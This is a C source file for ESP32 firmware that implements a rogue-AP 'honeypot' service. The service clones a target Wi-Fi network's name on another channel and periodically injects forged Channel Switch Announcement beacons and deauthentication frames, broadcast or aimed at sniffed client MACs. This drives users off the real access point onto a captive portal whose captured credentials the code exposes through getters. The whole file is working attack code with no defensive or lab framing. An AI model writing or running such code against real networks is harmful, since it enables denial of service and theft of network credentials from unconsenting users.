/*
 * wifi_honeypot_svc.c - Rogue AP + CSA/deauth lure injection service (no UI).
 *
 * Every HP_SVC_LURE_PERIOD_MS the portal is briefly paused, the radio hops to
 * the real AP's channel, injects HP_SVC_LURE_BURST CSA-beacon + deauth frames
 * (and in TARGETED mode also listens for DATA frames to learn client MACs),
 * then the portal is restarted on the honeypot channel.
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI
#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)

#include "wifi_honeypot_svc.h"
#include "wifi_common.h"

#include <string.h>
#include <stddef.h>

#define HP_SVC_LURE_PERIOD_MS  8000
#define HP_SVC_LURE_BURST      3
#define HP_SVC_MAX_CLIENTS     16

/* ── State ─────────────────────────────────────────────────────────────── */

static bool                 s_active        = false;
static honeypot_svc_mode_t  s_mode          = HONEYPOT_SVC_BROADCAST;
static char                 s_target_ssid[33];
static uint8_t              s_target_bssid[6];
static uint8_t              s_target_ch;
static uint8_t              s_hp_ch;

static uint8_t              s_clients[HP_SVC_MAX_CLIENTS][6];
static int                  s_client_count  = 0;

static uint32_t             s_lure_last_ms  = 0;
static uint32_t             s_lure_count    = 0;
static uint32_t             s_last_poll_ms  = 0;

/* ── Helpers ────────────────────────────────────────────────────────────── */

static uint8_t pick_hp_channel(uint8_t orig) {
    const uint8_t cands[] = {1, 6, 11};
    for (int i = 0; i < 3; i++)
        if (cands[i] != orig) return cands[i];
    return 1;
}

static bool client_known(const uint8_t mac[6]) {
    for (int i = 0; i < s_client_count; i++)
        if (memcmp(s_clients[i], mac, 6) == 0) return true;
    return false;
}

/* Promiscuous callback — collects client MACs from DATA frames on target ch.
 * Runs in the WiFi task during the brief lure channel-hop window.            */
static void sniff_client_cb(const uint8_t* frame, uint16_t len,
                            int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 22) return;
    if (((frame[0] >> 2) & 0x3) != 2) return;              /* DATA only      */
    if (memcmp(frame + 16, s_target_bssid, 6) != 0) return; /* our target AP  */
    const uint8_t* mac = frame + 10;                         /* Addr2 = STA    */
    if (!client_known(mac) && s_client_count < HP_SVC_MAX_CLIENTS)
        memcpy(s_clients[s_client_count++], mac, 6);
}

static int build_csa_beacon(uint8_t* buf, size_t buf_size) {
    int flen = wifi_build_beacon(buf, buf_size,
                                 s_target_ssid, s_target_bssid, s_target_ch);
    if (flen < 0 || flen + 5 > (int)buf_size) return flen;
    buf[flen++] = 0x25;     /* tag: Channel Switch Announcement */
    buf[flen++] = 0x03;
    buf[flen++] = 0x01;     /* mode: STAs stop transmitting     */
    buf[flen++] = s_hp_ch;  /* new channel                      */
    buf[flen++] = 0x01;     /* count: 1 beacon interval         */
    return flen;
}

/*
 * Inject CSA beacons + deauth on the target's channel.
 * Called from honeypot_svc_tick with the portal already stopped.
 * In TARGETED mode we also listen for DATA frames to collect client MACs.
 */
static void inject_lure(void) {
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frame[200];

    bs_wifi_monitor_start(s_target_ch,
                          (s_mode == HONEYPOT_SVC_TARGETED) ? sniff_client_cb : NULL,
                          NULL);

    /* CSA beacons tell lingering clients to move to s_hp_ch */
    for (int i = 0; i < HP_SVC_LURE_BURST; i++) {
        int flen = build_csa_beacon(frame, sizeof(frame));
        if (flen > 0)
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
    }

    if (s_mode == HONEYPOT_SVC_BROADCAST) {
        for (int i = 0; i < HP_SVC_LURE_BURST; i++) {
            int flen = wifi_build_deauth(frame, bcast,
                                        s_target_bssid, s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
        }
    } else {
        /* Directed deauth for every known client (both directions) */
        for (int ci = 0; ci < s_client_count; ci++) {
            int flen;
            flen = wifi_build_deauth(frame, s_clients[ci],
                                     s_target_bssid, s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
            flen = wifi_build_deauth(frame, s_target_bssid,
                                     s_clients[ci], s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
        }
        /* Broadcast fallback when no clients have been discovered yet */
        if (s_client_count == 0) {
            int flen = wifi_build_deauth(frame, bcast,
                                        s_target_bssid, s_target_bssid, 7);
            bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
        }
    }

    bs_wifi_monitor_stop();
    s_lure_count++;
}

/* ── Lifecycle ─────────────────────────────────────────────────────────── */

bool honeypot_svc_start(const char*         target_ssid,
                        const uint8_t       target_bssid[6],
                        uint8_t             target_ch,
                        uint8_t             hp_ch,
                        honeypot_svc_mode_t mode) {
    if (s_active) honeypot_svc_stop();

    strncpy(s_target_ssid, target_ssid ? target_ssid : "", 32);
    s_target_ssid[32] = '\0';
    memcpy(s_target_bssid, target_bssid, 6);
    s_target_ch    = target_ch;
    s_hp_ch        = (hp_ch == 0) ? pick_hp_channel(target_ch) : hp_ch;
    s_mode         = mode;
    s_client_count = 0;
    s_lure_last_ms = 0;
    s_lure_count   = 0;
    s_last_poll_ms = 0;

    s_active = wifi_portal_start(s_target_ssid, s_hp_ch, NULL);
    return s_active;
}

void honeypot_svc_stop(void) {
    wifi_portal_stop();
    s_active = false;
}

void honeypot_svc_tick(uint32_t now_ms) {
    if (!s_active) return;

    if (s_last_poll_ms == 0 || (now_ms - s_last_poll_ms) >= 10) {
        s_last_poll_ms = now_ms;
        wifi_portal_poll();
    }

    if (s_lure_last_ms == 0) s_lure_last_ms = now_ms;

    if ((now_ms - s_lure_last_ms) >= (uint32_t)HP_SVC_LURE_PERIOD_MS) {
        s_lure_last_ms = now_ms;
        /* Briefly pause the AP, inject on real channel, then restart */
        wifi_portal_stop();
        inject_lure();
        wifi_portal_start(s_target_ssid, s_hp_ch, NULL);
    }
}

/* ── Getters ────────────────────────────────────────────────────────────── */

bool honeypot_svc_active(void) {
    return s_active && wifi_portal_active();
}

int honeypot_svc_client_count(void) {
    return wifi_portal_client_count();
}

int honeypot_svc_cred_count(void) {
    return wifi_portal_cred_count();
}

const wifi_portal_cred_t* honeypot_svc_get_cred(int idx) {
    return wifi_portal_get_cred(idx);
}

uint32_t honeypot_svc_lure_count(void) {
    return s_lure_count;
}

#endif /* BS_WIFI_ESP32 && ARDUINO_ARCH_ESP32 */
#endif /* BS_HAS_WIFI */
